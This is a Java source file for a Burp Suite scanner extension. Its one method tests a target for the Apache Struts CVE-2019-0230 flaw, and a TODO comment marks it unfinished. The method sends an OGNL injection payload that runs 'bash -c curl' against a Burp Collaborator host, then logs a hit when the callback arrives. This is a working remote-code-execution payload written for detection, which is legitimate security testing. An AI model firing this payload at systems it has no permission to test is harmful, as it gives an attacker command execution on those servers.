package burp.vuls;

import burp.*;
import burp.util.HttpRequestThread;
import burp.util.HttpResult;

import java.util.List;

public class Struts {

    public static IExtensionHelpers helpers;
    public static IBurpExtenderCallbacks callbacks;
    public static List<BurpExtender.LogEntry> log;
    public static IHttpRequestResponse messageInfo;

    public static void CVE_2019_0230() {
        // TODO 待完成
        IBurpCollaboratorClientContext collaboratorClientContext = callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        String poc = "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(new java.lang.String[]{'bash','-c','curl http://" + val +"'}))}";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(helpers, callbacks, messageInfo, poc.getBytes());
        Thread thread = new Thread(httpRequestThread);
        thread.start();
        try {
            // 等待10s
            thread.join(10000);
        } catch (InterruptedException e) {
            callbacks.printOutput("InterruptedException: " + e.getMessage());
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            log.add(new BurpExtender.LogEntry(log.size(), callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.host, httpResult.path, httpResult.method, httpResult.status, "CVE-2019-0230 hack!"));
        }else {
            log.add(new BurpExtender.LogEntry(log.size(), callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.host, httpResult.path, httpResult.method, httpResult.status, "CVE-2019-0230 pass"));
        }
    }

}
